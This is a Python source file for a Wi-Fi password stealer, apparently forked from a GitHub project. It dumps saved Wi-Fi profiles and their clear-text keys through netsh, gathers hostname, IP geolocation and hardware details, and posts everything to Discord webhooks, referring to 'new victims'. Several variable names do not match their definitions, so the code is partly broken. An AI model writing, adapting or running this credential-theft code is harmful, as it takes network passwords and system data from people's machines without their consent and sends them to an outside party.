import io 
import subprocess 
import requests as req
import os
import webbrowser
import socket
from dhooks import Webhook, File
import platform
import wmi

os.system("color 0a") 
fname = "wifipasswords.txt"

hostname = socket.gethostname()
system_info = platform.uname()

wifi_hook = Webhook("https://discord.com/api/webhooks/")
no_wifi_hook = Webhook("https://discord.com/api/webhooks/") 
ip_hook = Webhook("https://discord.com/api/webhooks/") 

ip_data = req.get("http://ip-api.com/json").json()

with io.open(fname, 'w', encoding="utf-8") as file:
    file.write(str(ip_data))

ip_hook.send(f'''
@everyone
Hello there Young Lad,

Forked from https://github.com/abhinav-ranish/wifistealer
**--------------------------GRABBED_INFO-----------------------------**
Hostname = {hostname}
IP Data = {ip_data}

**---------------------------System Info-----------------------------**
System = {system_info.system}
Node Name = {system_info.node}
Release = {system_info.release}
Machine = {system_info.machine}
Processor = {system_info.processor}
Version = {system_info.version}

**----------------------------Windows PC----------------------------**
Manufacturer = {wmi.WMI().Win32}


Manufacturer = {wmi.WMI().Manufacturer}
Model = {wmi.WMI().Model}
Name = {wmi.WMI().Name}
NumberOfProcessors = {wmi.WMI().NumberOfProcessors}
SystemType = {wmi.WMI().SystemType}
SystemFamily = {wmi.WMI().SystemFamily}
-------------------------------------------------------------------
CC@ https://github.com/abhinav-ranish/wifistealer
-------------------------------------------------------------------
'''
)

#Nowifi dump and since its on another channel creates a sub heading for new victims

Wbhook_nowifi.send(f"**Hostname = {hostname}**")

Wbhook_wifi.send(f"**Node Name = {system_info.node}**  **Name = {wmi.WMI().Name}** ")

data = subprocess.check_output(['netsh', 'wlan', 'show', 'profile']).decode('utf-8').split('\n') #uses subprpocess module to acess windows cmds like netsh etc.

profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
for i in profiles:
    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n') #use netsh windows network manager tool to see wifi pass in clear.
    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b ]
    try:
        Wbhook_wifi.send ("{:<30}|   {:<}".format(i,results[0])) #sends wifi uname and psswd in a order
    except IndexError:
        Wbhook_nowifi.send ("{:<30}|   {:<}".format(i, "")) #send open wifis
    except:
        print("Errors Found") #overules any errors and doesnt kill the code


print("Task Completed") 


